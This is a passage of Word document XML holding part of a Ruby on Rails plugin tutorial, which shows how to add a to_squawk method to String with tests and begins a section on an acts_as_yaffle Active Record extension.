    <w:p w14:paraId="30721285" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You should see:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6240"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="7F9FFB91" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="233D3ED3" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="464398001"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>2 tests, 2 assertions, 0 failures, 0 errors, 0 skips</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3782DE7D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This will tell you that everything got generated properly and you are ready to start adding functionality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="329E4225" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>3 Extending Core Classes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C5C4C05" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This section will explain how to add a method to String that will be available anywhere in your rails application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BDD6010" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In this example you will add a method to String named </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_squawk</w:t>
      </w:r>
      <w:r>
        <w:t>. To begin, create a new test file with a few assertions:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8040"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="4ADBED6A" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="76BB3694" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># yaffle/test/core_ext_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0729B3D8" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65E5247B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'test_helper'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22B579AC" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2709800C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>CoreExtTest &lt; Test::Unit::TestCase</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3282078E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test_to_squawk_prepends_the_word_squawk</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41689918" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_equal "squawk! Hello World", "Hello World".to_squawk</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64C604A2" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BACAFAB" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="722FE17C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Run </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rake</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to run the test. This test should fail because we haven’t implemented the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_squawk</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method:</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208636BF" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="31EA340E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>1) Error:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00DBC70B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    test_to_squawk_prepends_the_word_squawk(CoreExtTest):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A6FAF31" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    NoMethodError: undefined method `to_squawk' for "Hello World":String</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79A09522" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>        test/core_ext_test.rb:5:in `test_to_squawk_prepends_the_word_squawk'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="57EF0325" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Great – now you are ready to start development.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07588068" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Then in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lib/yaffle.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> require </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lib/core_ext</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3000"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="0EEABE16" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6942C0B7" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># yaffle/lib/yaffle.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40E80964" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20BD2429" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require "yaffle/core_ext"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="132102C7" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74744383" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Yaffle</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B4EF3C6" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5E8B0C96" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Finally, create the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>core_ext.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file and add the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_squawk</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3720"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="2947BBC3" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="176EB1FC" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># yaffle/lib/yaffle/core_ext.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0CAEBBB6" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2663DA35" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>String.class_eval do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5FB6F9B8" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>to_squawk</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0996F937" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    "squawk! #{self}".strip</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7FE35FA2" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50D8D3F2" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3FFB014E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To test that your method does what it says it does, run the unit tests with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rake</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> from your plugin directory.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6240"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="61984309" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1B6DE288" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="1343557174"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>3 tests, 3 assertions, 0 failures, 0 errors, 0 skips</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2950A2FD" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>To see this in action, change to the test/dummy directory, fire up a console and start squawking:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3120"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="4CBDA210" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15897AE9" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails console</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="563CFC8F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&gt;&gt; "Hello World".to_squawk</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CB1D176" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "squawk! Hello World"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="21FF25F1" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>4 Add an “acts_as” Method to Active Record</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="545F5821" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>A common pattern in plugins is to add a method called ‘acts_as_something’ to models. In this case, you want to write a method called ‘acts_as_yaffle’ that adds a ‘squawk’ method to your Active Record models.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68C4D210" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>To begin, set up your files so that you have:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5328"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="44BDA197" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="61BB951D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># yaffle/test/acts_as_yaffle_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7454698D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65623544" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'test_helper'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03A2530A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0558583D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActsAsYaffleTest &lt; Test::Unit::TestCase</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="293DD914" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00185CB6" w14:paraId="1C05232B" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="39ED0914" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># yaffle/lib/yaffle.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55821B55" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B5F6843" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require "yaffle/core_ext"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="162FD11F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'yaffle/acts_as_yaffle'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="437652A0" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D4C9F17" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Yaffle</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F7FFC76" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0C22FC78" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
